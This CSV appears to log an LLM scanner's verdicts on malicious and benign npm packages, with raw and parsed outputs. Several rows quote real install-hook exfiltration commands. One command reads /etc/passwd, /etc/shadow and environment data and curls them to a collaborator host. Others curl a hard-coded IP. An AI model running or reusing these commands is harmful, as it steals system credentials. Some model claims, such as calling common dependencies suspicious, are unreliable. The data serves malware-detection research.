package_name,version,label,timestamp,routing,structural_risk_score,parse_success,total_behaviors,behavior_categories,max_confidence,model_name,prompt_version,raw_response,parsed_json,analyst_note
commerce-clients,999.9.9,malicious,2026-03-26T22:10:34.087700,flag,0.77,True,2,dynamic_code_execution;version_containing_flated_segment,0.82,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""dynamic_code_execution"",
      ""summary"": ""The code execution is performed dynamically using eval function in install.js file."",
      ""details"": ""The code execution is performed dynamically using eval function in install.js file. The code is decrypted using AES-256-ctr algorithm and then evaluated."",
      ""confidence"": 0.82,
      ""evidence_apis"": [],
      ""evidence_files"": [""install.js""],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""version_containing_flated_segment"",
      ""summary"": ""The version number contains inflated segment (999)."",
      ""details"": ""The version number contains inflated segment (999) in package.json file."",
      ""confidence"": 0.77,
      ""evidence_apis"": [],
      ""evidence_files"": [""package.json""],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""dynamic_code_execution"", ""version_containing_flated_segment""]
}
```

This JSON output indicates that the package has dynamic code execution and version containing inflated segment behavior. The confidence scores for these behaviors are 0.82 and 0.77 respectively. The details of these behaviors are also provided in the JSON output.","{""behaviors"": [{""category"": ""dynamic_code_execution"", ""summary"": ""The code execution is performed dynamically using eval function in install.js file."", ""details"": ""The code execution is performed dynamically using eval function in install.js file. The code is decrypted using AES-256-ctr algorithm and then evaluated."", ""confidence"": 0.82, ""evidence_apis"": [], ""evidence_files"": [""install.js""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}, {""category"": ""version_containing_flated_segment"", ""summary"": ""The version number contains inflated segment (999)."", ""details"": ""The version number contains inflated segment (999) in package.json file."", ""confidence"": 0.77, ""evidence_apis"": [], ""evidence_files"": [""package.json""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""dynamic_code_execution"", ""version_containing_flated_segment""]}",This JSON output indicates that the package has dynamic code execution and version containing inflated segment behavior. The confidence scores for these behaviors are 0.82 and 0.77 respectively. The details of these behaviors are also provided in the JSON output.
common-web-frontend-styling,9.9.9,malicious,2026-03-26T22:10:44.147200,review,0.364,True,1,network_exfiltration,0.78,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code is making network requests to a specific host."",
      ""details"": ""The code is making network requests to 'dc.70.lc' on port 443."",
      ""confidence"": 0.78,
      ""evidence_apis"": [""https.request""],
      ""evidence_files"": [""./.pbk.js""],
      ""evidence_domains"": [""dc.70.lc""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

This analysis indicates that the code is making network requests to a specific host, potentially for data exfiltration. The confidence score is 0.78, indicating a high level of confidence in the detection of this behavior. The evidence for this behavior comes from the use of the 'https.request' API in the './.pbk.js' file, and the domain 'dc.70.lc'.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making network requests to a specific host."", ""details"": ""The code is making network requests to 'dc.70.lc' on port 443."", ""confidence"": 0.78, ""evidence_apis"": [""https.request""], ""evidence_files"": [""./.pbk.js""], ""evidence_domains"": [""dc.70.lc""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","that the code is making network requests to a specific host, potentially for data exfiltration. The confidence score is 0.78, indicating a high level of confidence in the detection of this behavior. The evidence for this behavior comes from the use of the 'https.request' API in the './.pbk.js' file, and the domain 'dc.70.lc'."
common-web-frontend-styling,9.99.999,malicious,2026-03-26T22:10:53.237857,review,0.494,True,1,network_exfiltration,0.71,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code is making a network request to a specific host."",
      ""details"": ""The code is making a network request to 'dc.70.lc' on port 443."",
      ""confidence"": 0.71,
      ""evidence_apis"": [""https.request""],
      ""evidence_files"": [],
      ""evidence_domains"": [""dc.70.lc""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

This analysis indicates that the code is making a network request to a specific host, which is a potential behavior associated with network exfiltration. The confidence score is 0.71, indicating a high level of confidence in this behavior. The evidence for this behavior comes from the use of the 'https.request' API, which is a network request, and the domain 'dc.70.lc' which is the host being requested.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making a network request to a specific host."", ""details"": ""The code is making a network request to 'dc.70.lc' on port 443."", ""confidence"": 0.71, ""evidence_apis"": [""https.request""], ""evidence_files"": [], ""evidence_domains"": [""dc.70.lc""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","that the code is making a network request to a specific host, which is a potential behavior associated with network exfiltration. The confidence score is 0.71, indicating a high level of confidence in this behavior. The evidence for this behavior comes from the use of the 'https.request' API, which is a network request, and the domain 'dc.70.lc' which is the host being requested."
compositionupdate,88.8.8,malicious,2026-03-26T22:11:02.527311,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a known exfiltration collector domain."",
      ""details"": ""The code makes a network request to a domain known to exfiltration collectors. The request sends tracking data in the POST body."",
      ""confidence"": 0.79,
      ""evidence_apis"": [""https.request""],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""oiaqaquemkde49kzmhr5ot4uhlnbb0.burpcollaborator.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package is likely involved in data exfiltration. The evidence suggests that the package is making network requests to a known exfiltration collector domain, which is a common practice for data exfiltration. The confidence score of 0.79 indicates a high level of certainty that this behavior is malicious.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a known exfiltration collector domain."", ""details"": ""The code makes a network request to a domain known to exfiltration collectors. The request sends tracking data in the POST body."", ""confidence"": 0.79, ""evidence_apis"": [""https.request""], ""evidence_files"": [""index.js""], ""evidence_domains"": [""oiaqaquemkde49kzmhr5ot4uhlnbb0.burpcollaborator.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package is likely involved in data exfiltration. The evidence suggests that the package is making network requests to a known exfiltration collector domain, which is a common practice for data exfiltration. The confidence score of 0.79 indicates a high level of certainty that this behavior is malicious."
conflicting_modules,1.0.0,malicious,2026-03-26T22:11:18.945487,flag,1.0,True,2,data_exfiltration;network_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a known exfiltration collector domain."",
      ""details"": ""The code makes a POST request to a known exfiltration collector domain (ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net) in the index.js file at line 25."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code sends network requests to a known exfiltration collector domain."",
      ""details"": ""The code makes a POST request to a known exfiltration collector domain (ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net) in the index.js file at line 25."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration"", ""network_exfiltration""]
}
```

This analysis indicates that the package is likely involved in data exfiltration and network exfiltration. The evidence suggests that the package sends network requests to a known exfiltration collector domain. The confidence score for these behaviors is 0.79, indicating a high level of malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a known exfiltration collector domain."", ""details"": ""The code makes a POST request to a known exfiltration collector domain (ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net) in the index.js file at line 25."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}, {""category"": ""network_exfiltration"", ""summary"": ""The code sends network requests to a known exfiltration collector domain."", ""details"": ""The code makes a POST request to a known exfiltration collector domain (ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net) in the index.js file at line 25."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration"", ""network_exfiltration""]}","that the package is likely involved in data exfiltration and network exfiltration. The evidence suggests that the package sends network requests to a known exfiltration collector domain. The confidence score for these behaviors is 0.79, indicating a high level of malicious intent."
@grubhubprod/cookbook,9999.9999.2,malicious,2026-03-26T22:11:29.429773,flag,1.0,True,1,network_exfiltration,0.85,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[{""category"":""network_exfiltration"",""summary"":""The code sends network requests to an external IP address (44.196.248.120) in the install process."",""details"":""The code sends network requests to an external IP address (44.196.248.120) in the install process. This could potentially be indicative of network exfiltration, where sensitive data is being sent to an unauthorized location."",""confidence"":0.85,""evidence_apis"":[""https:request""],""evidence_files"":[""index.js""],""evidence_domains"":[""44.196.248.120""],""evidence_commands"":[],""evidence_env_vars"":[]}],""risk_vector"":[""network_exfiltration""]}```


The code is making network requests to an external IP address (44.196.248.120) in the install process. This could potentially be indicative of network exfiltration, where sensitive data is being sent to an unauthorized location. The evidence for this behavior comes from the API call 'https:request' in the file 'index.js' and the domain '44.196.248.120'.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code sends network requests to an external IP address (44.196.248.120) in the install process."", ""details"": ""The code sends network requests to an external IP address (44.196.248.120) in the install process. This could potentially be indicative of network exfiltration, where sensitive data is being sent to an unauthorized location."", ""confidence"": 0.85, ""evidence_apis"": [""https:request""], ""evidence_files"": [""index.js""], ""evidence_domains"": [""44.196.248.120""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","The code is making network requests to an external IP address (44.196.248.120) in the install process. This could potentially be indicative of network exfiltration, where sensitive data is being sent to an unauthorized location. The evidence for this behavior comes from the API call 'https:request' in the file 'index.js' and the domain '44.196.248.120'."
copy-webpack-plugin-v6,6.0.0,malicious,2026-03-26T22:11:43.400624,review,0.336,True,2,install_hook;suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata."",
      ""details"": ""The package contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata. This could potentially be a malicious payload."",
      ""confidence"": 0.72,
      ""evidence_commands"": [""preinstall:shpre.sh""],
      ""evidence_files"": [""packagefile_structure""],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""suspicious_behavior"",
      ""summary"": ""Package contains no JavaScript files."",
      ""details"": ""The package contains no JavaScript files, which could indicate suspicious behavior."",
      ""confidence"": 0.34,
      ""evidence_commands"": [],
      ""evidence_files"": [""packagefile_structure""],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook"", ""suspicious_behavior""]
}
```

This JSON object represents the analysis of the npm package 'copy-webpack-plugin-v6' version '6.0.0'. The analysis indicates that the package contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata, which could potentially be a malicious payload. The package also contains no JavaScript files, which could indicate suspicious behavior. The overall risk score is 0.34 and the confidence level is 0.72.","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata."", ""details"": ""The package contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata. This could potentially be a malicious payload."", ""confidence"": 0.72, ""evidence_commands"": [""preinstall:shpre.sh""], ""evidence_files"": [""packagefile_structure""], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}, {""category"": ""suspicious_behavior"", ""summary"": ""Package contains no JavaScript files."", ""details"": ""The package contains no JavaScript files, which could indicate suspicious behavior."", ""confidence"": 0.34, ""evidence_commands"": [], ""evidence_files"": [""packagefile_structure""], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook"", ""suspicious_behavior""]}","This JSON object represents the analysis of the npm package 'copy-webpack-plugin-v6' version '6.0.0'. The analysis indicates that the package contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata, which could potentially be a malicious payload. The package also contains no JavaScript files, which could indicate suspicious behavior. The overall risk score is 0.34 and the confidence level is 0.72."
core-argos-litelement-artifact,1.0.0,malicious,2026-03-26T22:11:44.703445,skip,0.144,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
createtile,99.0.0,malicious,2026-03-26T22:12:10.279046,flag,0.7773,True,2,data_exfiltration;install_hook,0.83,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain."",
      ""details"": ""The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain. The domain is 'linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net'. This could potentially indicate data exfiltration."",
      ""confidence"": 0.83,
      ""evidence_domains"": [""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net""],
      ""evidence_commands"": [""export HOSTNAME&&BCNET=\""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"";sleep.5;ping-c1$BCNET;foriinenv\""psaux\""cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\""cat/etc/hosts/etc/passwd/etc/shadow\"";docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)\"";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true""]
    },
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package.json scripts.preinstall command is a known install hook."",
      ""details"": ""The package.json scripts.preinstall command is a known install hook. This could potentially indicate a supply chain attack."",
      ""confidence"": 0.83,
      ""evidence_commands"": [""export HOSTNAME&&BCNET=\""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"";sleep.5;ping-c1$BCNET;foriinenv\""psaux\""cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\""cat/etc/hosts/etc/passwd/etc/shadow\"";docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)\"";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true""]
    }
  ],
  ""risk_vector"": [""data_exfiltration"", ""install_hook""]
}
```","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain."", ""details"": ""The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain. The domain is 'linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net'. This could potentially indicate data exfiltration."", ""confidence"": 0.83, ""evidence_domains"": [""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net""], ""evidence_commands"": [""export HOSTNAME&&BCNET=\""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"";sleep.5;ping-c1$BCNET;foriinenv\""psaux\""cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\""cat/etc/hosts/etc/passwd/etc/shadow\"";docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)\"";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true""]}, {""category"": ""install_hook"", ""summary"": ""The package.json scripts.preinstall command is a known install hook."", ""details"": ""The package.json scripts.preinstall command is a known install hook. This could potentially indicate a supply chain attack."", ""confidence"": 0.83, ""evidence_commands"": [""export HOSTNAME&&BCNET=\""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"";sleep.5;ping-c1$BCNET;foriinenv\""psaux\""cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\""cat/etc/hosts/etc/passwd/etc/shadow\"";docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)\"";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true""]}], ""risk_vector"": [""data_exfiltration"", ""install_hook""]}",
cron-guru,1.0.2,malicious,2026-03-26T22:12:17.546585,review,0.42,True,1,obfuscation,0.9,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""obfuscation"",
      ""summary"": ""Obfuscation is being used in the code."",
      ""details"": ""The code appears to be obfuscating sensitive data using the js-obfuscator tool."",
      ""confidence"": 0.9,
      ""evidence_apis"": [""post""],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""obfuscation""]
}
```

This analysis confirms the presence of obfuscation in the code, with a high level of confidence. The obfuscation tool signature '_0xpattern' is evident in the code, indicating the presence of obfuscation.","{""behaviors"": [{""category"": ""obfuscation"", ""summary"": ""Obfuscation is being used in the code."", ""details"": ""The code appears to be obfuscating sensitive data using the js-obfuscator tool."", ""confidence"": 0.9, ""evidence_apis"": [""post""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""obfuscation""]}","This analysis confirms the presence of obfuscation in the code, with a high level of confidence. The obfuscation tool signature '_0xpattern' is evident in the code, indicating the presence of obfuscation."
crypto-standarts,4.1.2,malicious,2026-03-26T22:12:18.976621,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
cryptotickets,99.99.99,malicious,2026-03-26T22:12:29.875367,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a domain that appears to be a known exfiltration collector."",
      ""details"": ""The code makes a network request to 'w1yg57i1m385uznyrs3yls1phgn6bv.burpcollaborator.net' in the index.js file at line 25. This domain is associated with known exfiltration collectors."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""w1yg57i1m385uznyrs3yls1phgn6bv.burpcollaborator.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the code is likely involved in data exfiltration. The network request to 'w1yg57i1m385uznyrs3yls1phgn6bv.burpcollaborator.net' in the index.js file is a strong signal of this intent. The confidence score is 0.79, indicating a high level of malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a domain that appears to be a known exfiltration collector."", ""details"": ""The code makes a network request to 'w1yg57i1m385uznyrs3yls1phgn6bv.burpcollaborator.net' in the index.js file at line 25. This domain is associated with known exfiltration collectors."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""w1yg57i1m385uznyrs3yls1phgn6bv.burpcollaborator.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the code is likely involved in data exfiltration. The network request to 'w1yg57i1m385uznyrs3yls1phgn6bv.burpcollaborator.net' in the index.js file is a strong signal of this intent. The confidence score is 0.79, indicating a high level of malicious intent."
cs_kid,2.1.0,malicious,2026-03-26T22:12:40.391182,flag,0.9693,True,1,network_exfiltration,0.97,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The package contains a hardcoded external IP address '185.215.180.56' in the pre-install script."",
      ""details"": ""The hardcoded external IP address '185.215.180.56' in the pre-install script of the package points to a network exfiltration risk."",
      ""confidence"": 0.97,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [""curl 185.215.180.56:9012""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

This JSON object represents the analysis of the package. The package contains a network exfiltration risk due to the hardcoded external IP address '185.215.180.56' in the pre-install script. The risk is high (confidence score of 0.97). The evidence of this risk comes from the command ""curl 185.215.180.56:9012"" in the pre-install script.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The package contains a hardcoded external IP address '185.215.180.56' in the pre-install script."", ""details"": ""The hardcoded external IP address '185.215.180.56' in the pre-install script of the package points to a network exfiltration risk."", ""confidence"": 0.97, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""curl 185.215.180.56:9012""], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","This JSON object represents the analysis of the package. The package contains a network exfiltration risk due to the hardcoded external IP address '185.215.180.56' in the pre-install script. The risk is high (confidence score of 0.97). The evidence of this risk comes from the command ""curl 185.215.180.56:9012"" in the pre-install script."
cs_kid,3.1.0,malicious,2026-03-26T22:12:50.687252,flag,0.9693,True,1,network_exfiltration,0.97,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The package contains a hardcoded external IP address '185.215.180.56' in the pre-install script."",
      ""details"": ""The package.json file contains a pre-install script that hardcodes the external IP address '185.215.180.56'."",
      ""confidence"": 0.97,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [""curl `whoami`.185.215.180.56:9012""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

This JSON object represents the analysis of the package. The behavior category is 'network_exfiltration', which is confirmed by the signals and the primary risk is the hardcoded external IP address '185.215.180.56' in the pre-install script. The confidence score is 0.97, indicating high confidence in the detection of this behavior. The details of the behavior, including the evidence commands, are also provided.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The package contains a hardcoded external IP address '185.215.180.56' in the pre-install script."", ""details"": ""The package.json file contains a pre-install script that hardcodes the external IP address '185.215.180.56'."", ""confidence"": 0.97, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""curl `whoami`.185.215.180.56:9012""], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","This JSON object represents the analysis of the package. The behavior category is 'network_exfiltration', which is confirmed by the signals and the primary risk is the hardcoded external IP address '185.215.180.56' in the pre-install script. The confidence score is 0.97, indicating high confidence in the detection of this behavior. The details of the behavior, including the evidence commands, are also provided."
@actions/core,1.10.1,benign,2026-03-26T22:12:51.996741,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[],""risk_vector"":[]}```


```","{""behaviors"": [], ""risk_vector"": []}",
@alifd/next,1.26.24,benign,2026-03-26T22:12:53.292159,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
@ampproject/remapping,2.2.1,benign,2026-03-26T22:12:54.802462,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```","{""behaviors"": [], ""risk_vector"": []}",
@angular-devkit/core,16.2.3,benign,2026-03-26T22:12:56.468623,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```","{""behaviors"": [], ""risk_vector"": []}",
@ant-design/icons,5.2.6,benign,2026-03-26T22:12:57.935492,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```","{""behaviors"": [], ""risk_vector"": []}",
@apidevtools/json-schema-ref-parser,11.1.0,benign,2026-03-26T22:13:08.671718,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"Based on the provided JavaScript code, it appears that the package is primarily focused on parsing JSON schema files and resolving references within them. However, there are no evident malicious behaviors or suspicious patterns in the code.


## Static Analysis

The static analysis of the code indicates that the package is using several dependencies including `@jsdevtools/ono`, `@types/json-schema`, `@types/lodash.clonedeep`, `js-yaml`, `lodash.clonedeep`, `@types/eslint`, `@types/js-yaml`, and `@types/node`. These dependencies are not standard or commonly used in JavaScript and may indicate potential malicious activities.

## Risk Vector

Based on the provided information, the risk vector is empty as no malicious behaviors or suspicious patterns are detected.

## Output

The output of the analysis is a JSON object with an empty ""behaviors"" array and an empty ""risk_vector"".

```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

Please note that this analysis is based on the provided code and does not guarantee the safety of the package. For a comprehensive security analysis, it is recommended to conduct a full code review and possibly conduct a dynamic analysis.","{""behaviors"": [], ""risk_vector"": []}","that this analysis is based on the provided code and does not guarantee the safety of the package. For a comprehensive security analysis, it is recommended to conduct a full code review and possibly conduct a dynamic analysis."
@apollo/client,3.8.4,benign,2026-03-26T22:13:10.085217,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
@assemblyscript/loader,0.27.9,benign,2026-03-26T22:13:11.729161,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```","{""behaviors"": [], ""risk_vector"": []}",
@aws-cdk/aws-ec2,1.204.0,benign,2026-03-26T22:13:13.621163,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```","{""behaviors"": [], ""risk_vector"": []}",
